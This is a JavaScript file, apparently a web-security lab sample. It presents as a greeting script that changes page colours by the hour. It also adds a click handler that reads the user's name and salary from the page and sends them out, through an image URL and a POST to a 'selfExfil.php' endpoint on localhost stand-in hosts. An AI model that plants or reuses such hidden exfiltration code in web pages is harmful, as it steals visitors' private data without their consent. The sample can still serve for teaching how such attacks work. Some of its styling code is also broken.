var d    = new Date();
var time = d.getHours();

var greetingNode = document.getElementById("greeting");
var message = "Good day!";
document.body.style.fontStyle.color = "black";

if (time > 0 && time <= 6) {
  document.body.style.backgroundColor = "black";
  document.body.style.fontStyle.color = "white";
  message                             = "You really should be sleeping right now!";
} else if (time > 6 && time < 12) {
  document.body.style.backgroundColor = "yellow";
  message                             = "Good Morning!";
} else if (time == 12) {
  document.body.style.backgroundColor = "orange";
  message                             = "It's noon. You should get some lunch.";
} else if (time > 12 && time < 17) {
  document.body.style.backgroundColor = "red";
  message                             = "Good Afternoon!";
} else if (time >= 17 && time <= 23) {
  document.body.style.backgroundColor = "blue";
  message                             = "You should not be at the office right now!";
}

var welcomeText = document.createTextNode(message);
greetingNode.appendChild(welcomeText);

document.addEventListener("click", function () {
  var salaryField = document.getElementById("OwnSalary");
  var text        = salaryField.innerHTML;

  var malImg    = document.createElement("img");
  var commaPos  = text.indexOf(",");
  var dollarPos = text.indexOf("$");
  var name      = text.slice(3,commaPos);
  var salary    = text.slice(dollarPos+1);
  malImg.setAttribute("src","http://localhost:8081/" + name + "_" + salary + ".jpg");
  $.post('http://localhost:8080/selfExfil.php',{message:text});

  //The following would not work due to violation of the same origin policy enforced on all modern browsers.
  //$.post('http://localhost:8081/exfil.php',{message:text});

});
